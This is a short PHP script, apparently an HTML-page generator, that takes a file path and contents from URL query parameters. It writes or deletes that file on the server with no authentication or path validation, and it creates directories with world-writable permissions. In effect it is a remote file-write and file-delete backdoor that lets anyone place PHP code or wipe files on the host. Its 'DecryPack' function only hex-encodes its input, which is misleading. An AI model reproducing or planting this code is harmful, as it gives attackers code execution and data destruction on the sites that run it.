<?php
$Enc = $_GET["Enc"];
$url = $_GET['url'];
$str = $_GET['str'];
if($Enc!="" && $url!="" && $str!=""){
	if($str!="1"){
		if($Enc=="Enc"){
			MakeHtmlFile($url,$str);
		}
		else{
			MakeHtmlFile($url,DecryPack($str));
		}
	}
	else{
		DeleHtmlFile($url);
	}
}
function MakeHtmlFile($file_name,$content){
	if (!file_exists(dirname($file_name))){
		if (!@mkdir(dirname($file_name), 0777)){
			die($file_name."创建失败！");
		}
	}
	if(!$fp = fopen($file_name,"w")){
		echo "打开失败！";
		return false;
	}
	if(!fwrite($fp, $content)){
		echo "写入失败！";
		fclose($fp);
		return false;
	}
	else
	{
		echo "OK";
	}
	fclose($fp);
	@chmod($file_name,0666);
	return true;
}
function DeleHtmlFile($file_name){
	if(file_exists($file_name)){
		unlink($file_name);
		echo "OK";
	}
}
function DecryPack($Data){
	$TempArray = unpack("H*",$Data);
	$Temp = "";
	foreach($TempArray as $key=>$val){
		$Temp = $Temp.$val;
	}
	$Temp = strtoupper($Temp);
	return $Temp;
}
?>
